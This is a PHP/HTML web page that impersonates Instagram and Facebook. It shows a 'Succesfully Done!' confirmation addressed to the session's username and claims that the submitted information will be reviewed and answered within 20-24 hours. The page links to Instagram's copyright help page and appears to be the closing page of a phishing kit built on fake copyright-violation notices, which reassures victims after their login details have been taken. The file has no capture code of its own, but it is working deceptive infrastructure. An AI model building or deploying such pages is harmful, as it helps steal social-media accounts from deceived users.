<?php 
ob_start();
session_start();
error_reporting(0);
set_time_limit(0);

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You | @<?php echo $_SESSION["username"]; ?></title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/WjbGH9Owc-X.ico">
    <!--Favicon-->
    <style>
        body {
            background-color: #000100;
            color: white;
        }

        .container {
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }

        .logo-box {
            display: flex;
            justify-content: center;
            margin-top: 61px;
        }

        .user-photo img {
            margin-top: 20px;
            border-radius: 50%;
            height: 100px;
        }

        .text {
            font-size: 15px;
            display: flex;
            justify-content: center;
            margin-top: 41px;
            margin-left: auto;
            margin-right: 10px;
        }

        .text p {
            color: #EDEDED;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .message {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        p {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .form {
            margin-top: 25px;
            display: flex;
            justify-content: center;
        }

        .form input {
            background: none;
            border: 1px solid #EBEBEB;
            border-radius: 25px;
            color: white;
            height: 20px;
            width: 200px;
            text-align: center;
        }

        ::placeholder {
            color: #D0D3D4;
            opacity: 1;
        }

        :-ms-input-placeholder {
            color: #D0D3D4;
        }

        ::-ms-input-placeholder {
            color: #D0D3D4;
        }

        .form button {
            background: none;
            color: white;
            border-radius: 25px;
            border: 2px solid white;
            width: 220px;
            height: 40px;
        }

        .company {
            display: flex;
            justify-content: center;
            margin-top: 30px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .footer {
            background: #212221;
            height: 440px;
            margin-bottom: 0;
            margin-left: 15%;
            margin-right: 15%;
        }

        #copyright {
            color: white;
        }

        #menu {
            display: inline;
            margin-top: 45px;
            width: 90%;
            margin-left: 35px;
        }

        #liste {
            display: inline-block;
        }

        #link {
            text-decoration: none;
            color: white;
            font-family: sans-serif;
            font-size: 13px;
            font-weight: 540;
            vertical-align: baseline;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo-box">
            <img src="instagram.png">
        </div>
        <div class="user-photo">
            <img src="basarili.png">
        </div>
        <div class="message">
            <h1>Succesfully Done!</h1>
        </div>
        <div class="text">
            <p>Hello Dear <?php echo "@" . $_SESSION["username"];  ?></a>, The information you have sent will be reviewed by our team and the result will be sent to your e-mail address registered in your system between 20-24 hours.</p>
        </div>
        <p>For More Help, Button Below.</p>
        <div class="form">
            <form action="https://help.instagram.com/454951664593304">
                <button type="submit" style="font-family: Helvetica Neue, Helvetica, Arial, lucida grande, tahoma, verdana, arial, sans-serif;font-weight:700;color: #fff;">About an Copyright Violation</button><br><br><br><br>
            </form>
        </div>
        <div id="menu">
            <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li>
        </div> <br>
        <div class="company">
            <p style="font-weight:100;"><strong style="color: #4267B2;">FROM FACEBOOK</strong></p>
        </div>
    </div>
</body>

</html>